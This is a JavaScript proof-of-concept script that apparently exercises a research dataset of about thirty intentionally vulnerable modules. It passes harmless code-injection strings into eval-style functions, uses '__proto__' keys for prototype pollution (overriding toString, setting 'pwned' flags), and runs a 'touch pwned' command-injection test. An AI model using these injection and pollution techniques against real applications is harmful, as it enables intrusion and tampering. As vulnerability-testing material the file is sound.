/**
 * PoC exploits for the example dataset
 */

// ================== Example 0 ==================
const example0 = require("../example-0");
console.log(`Example 0: ${example0("2+2")}`);

// ================== Example 1 ==================
const example1 = require("../example-1");
console.log(`Example 1: ${example1("2+2")}`);

// ================== Example 2 ==================
const example2 = require("../example-2");
console.log(`Example 2: ${example2("2+2")}`);

// ================== Example 3 ==================
const example3 = require("../example-3");
const o = {
    z: 1,
    w: "+2"
};
console.log(`Example 3: ${example3(o)}`);

// ================== Example 4 ==================
const example4 = require("../example-4");
const req = {
    body: {
        param: "2+2"
    }
};
console.log(`Example 4: ${example4(req)}`);

// ================== Example 5 ==================
const example5 = require("../example-5");
console.log(`Example 5: ${example5()}`);

// ================== Example 6 ==================
const example6 = require("../example-6");
console.log(`Example 6: ${example6()}`);

// ================== Example 7 ==================
const example7 = require("../example-7");
console.log(`Example 7: ${example7("2+2")}`);

// ================== Example 8 ==================
const example8 = require("../example-8");
console.log("Example 8.1:");
example8("role", "admin");

function newToString() {
    return "Hacked toString Implementation :)";
}

console.log("Example 8.2:");
example8("__proto__", { toString: newToString });
console.log("Example 8.3:");
example8("toString", newToString);

// ================== Example 9 ==================
const example9 = require("../example-9");
console.log(`Example 9: ${example9("+2", "x")}`);

// ================== Example 10 ==================
const example10 = require("../example-10");
console.log(`Example 10: ${example10("2+2")}`);

// ================== Example 11 ==================
const example11 = require("../example-11");
console.log(`Example 11: ${example11("2+2")}`);

// ================== Example 12 ==================
const example12 = require("../example-12");
console.log(`Example 12: ${example12({ p: "2+2" }, "p")}`);

// ================== Example 13 ==================
const example13 = require("../example-13");
console.log(`Example 13: ${example13(1, "2+2")}`);

// ================== Example 14 ==================
const example14 = require("../example-14");

console.log("Example 14.1:");
example14("name", "first", "person2");

console.log("Example 14.2:");
console.log(`Prototype Polluted: ${{}.vulnerable14 === "pwned"}`);
example14("__proto__", "vulnerable14", "pwned");
console.log(`Prototype Polluted: ${{}.vulnerable14 === "pwned"}`);

// ================== Example 15 ==================
const example15 = require("../example-15");
console.log("Example 15:");
console.log(`Prototype Polluted: ${{}.vulnerable15 === "pwned"}`);
example15(["__proto__", "vulnerable15"], "pwned");
console.log(`Prototype Polluted: ${{}.vulnerable15 === "pwned"}`);

// ================== Example 16 ==================
const example16 = require("../example-16");
console.log(`Example 16: ${example16("2+2")}`);

// ================== Example 17 ==================
const example17 = require("../example-17");

console.log("Example 17.1:");
example17("role", "admin");

function newToString() {
    return "Hacked toString Implementation :)";
}

console.log("Example 17.2:");
example17("__proto__", { toString: newToString });
console.log("Example 17.3:");
example17("toString", newToString);

// ================== Example 18 ==================
const example18 = require("../example-18");

console.log("Example 18.1:");
example18("role", "admin");

function newToString() {
    return "Hacked toString Implementation :)";
}

console.log("Example 18.2:");
example18("__proto__", { toString: newToString });
console.log("Example 18.3:");
example18("toString", newToString);

// ================== Example 19 ==================
const example19 = require("../example-19");

console.log("Example 19.1:");
console.log(`customer.role => ${example19("role", "admin").role}`);

function newToString() {
    return "Hacked toString Implementation :)";
}

console.log("Example 19.2:");
console.log(`toString implementation => ${example19("__proto__", { toString: newToString }).toString()}`);
console.log("Example 19.3:");
console.log(`toString implementation => ${example19("toString", newToString).toString()}`);

// ================== Example 20 ==================

// ================== Example 21 ==================
const example21 = require("../example-21");

console.log("Example 21.1:");
example21("name", "first", "letter", "morse", ".");

function newToString() {
    return "Hacked toString Implementation :)";
}

console.log("Example 21.2:");
example21("name", "first", "letter", "__proto__", { toString: newToString });
console.log("Example 21.3:");
example21("name", "first", "letter", "toString", newToString);

// ================== Example 22 ==================
const example22 = require("../example-22");
console.log("Example 22.1:");
example22("role", "admin");

function newToString() {
    return "Hacked toString Implementation :)";
}

console.log("Example 22.2:");
example22("__proto__", { toString: newToString });
console.log("Example 22.3:");
example22("toString", newToString);

// ================== Example 23 ==================
const example23 = require("../example-23");
console.log(`Example 23: ${example23("2+2")()}`);

// ================== Example 24 ==================
const example24 = require("../example-24");
console.log(`Example 24: ${example24("2+2")}`);

// ================== Example 25 ==================
const example25 = require("../example-25");
console.log("Example 25:");
example25("touch pwned");
if (require('fs').existsSync('pwned')) {
    console.log('Created file pwned!');
    require('fs').unlinkSync('pwned');
}

// ================== Example 26 ==================
const example26 = require("../example-26/source");
console.log(`Example 26: ${example26("2+2")}`);

// ================== Example 27 ==================
// $ node example-27.js "console.log('pwned')"

// ================== Example 28 ==================
const example28 = require("../example-28");
const cla = new example28();
console.log(`Example 28: ${cla.ev("2+2")}`);

// ================== Example 29 ==================
const example29 = require("../example-29");
console.log(`Example 29: ${example29("2+2")()}`);

// ================== Example 30==================
const example30 = require("../example-30");
console.log(`Example 30: ${example30("2+2")}`);